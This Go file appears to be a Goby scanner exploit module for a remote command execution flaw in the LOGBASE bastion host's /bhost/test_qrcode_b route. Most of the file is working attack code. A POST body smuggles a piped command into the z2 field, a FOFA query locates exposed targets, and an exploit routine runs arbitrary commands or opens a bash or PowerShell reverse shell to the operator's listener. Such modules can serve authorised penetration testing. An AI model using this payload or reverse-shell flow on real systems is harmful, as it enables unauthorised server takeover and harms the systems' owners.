package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "LOGBASE test_qrcode_b Remote Command Execution Vulnerability",
    "Description": "<p>LOGBASE is an operation and maintenance security management bastion machine developed by Sifudi.</p><p>There is a command execution vulnerability in the test_qrcode_b route of this operation and maintenance security management system.</p>",
    "Product": "Sifudi-LOGBASE",
    "Homepage": "http://www.logbase.cn/",
    "DisclosureDate": "2023-02-20",
    "Author": "goby777_",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time：</p><p><a href=\"http://www.logbase.cn/\">http://www.logbase.cn/</a></p>",
    "References": [
        "http://www.logbase.cn/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "linux,windows",
            "show": "attackType=reverse"
        }
    ],
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": [
        "AND"
    ],
    "Tags": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "9.6",
    "AttackSurfaces": {
        "Application": [
            "LanhaiZuoyue system"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "Is0day": false,
    "VulType": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "思福迪运维安全管理系统 test_qrcode_b 命令执行漏洞",
            "Product": "思福迪-LOGBASE 堡垒机",
            "Description": "<p>思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。</p><p>思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新:<br></p><p><a href=\"http://www.logbase.cn/\">http://www.logbase.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "LOGBASE test_qrcode_b Remote Command Execution Vulnerability",
            "Product": "Sifudi-LOGBASE",
            "Description": "<p>LOGBASE is an operation and maintenance security management bastion machine developed by Sifudi.</p><p>There is a command execution vulnerability in the test_qrcode_b route of this operation and maintenance security management system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time：<br></p><p><a href=\"http://www.logbase.cn/\">http://www.logbase.cn/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "((title=\"Logbase\" || header=\"Server: dummy\" || body=\"onclick=\\\"location.href='trustcert.cgi'\") && body!=\"couchdb\") || banner=\"Server: dummy\"",
    "GobyQuery": "((title=\"Logbase\" || header=\"Server: dummy\" || body=\"onclick=\\\"location.href='trustcert.cgi'\") && body!=\"couchdb\") || banner=\"Server: dummy\"",
    "PostTime": "2023-09-05",
    "PocId": "10834"
}`

	sendPayloadc782a83a := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/bhost/test_qrcode_b")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Referer", hostInfo.FixedHostInfo)
		cfg.Data = "z1=1&z2=\"|" + url.QueryEscape(cmd) + ";\"&z3=bhost"

		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			rsp, err := sendPayloadc782a83a(u, "echo "+checkStr)
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			waitSessionCh := make(chan string)
			if attackType == "reverse" {
				if goutils.B2S(ss.Params["reverse"]) == "linux" {
					rp, err := godclient.WaitSession("reverse_linux", waitSessionCh)
					if err != nil || len(rp) == 0 {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					cmd = godclient.ReverseTCPByBash(rp)
				} else {
					rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
					if err != nil || len(rp) == 0 {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					cmd = godclient.ReverseTCPByPowershell(rp)
				}
				go sendPayloadc782a83a(expResult.HostInfo, cmd)
				select {
				case webConsoleId := <-waitSessionCh:
					if u, err := url.Parse(webConsoleId); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						expResult.Output = `<br/> <a href="goby://sessions/view?sid=` + strings.Join(u.Query()["id"], "") + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 10):
					expResult.Success = false
					expResult.Output = "反弹失败，请确认目标是否出网"
				}
				return expResult
			} else {
				rsp, err := sendPayloadc782a83a(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if rsp.StatusCode == 200 && !strings.Contains(rsp.Utf8Html, "\"Result\":false") {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
				return expResult
			}
		},
	))
}
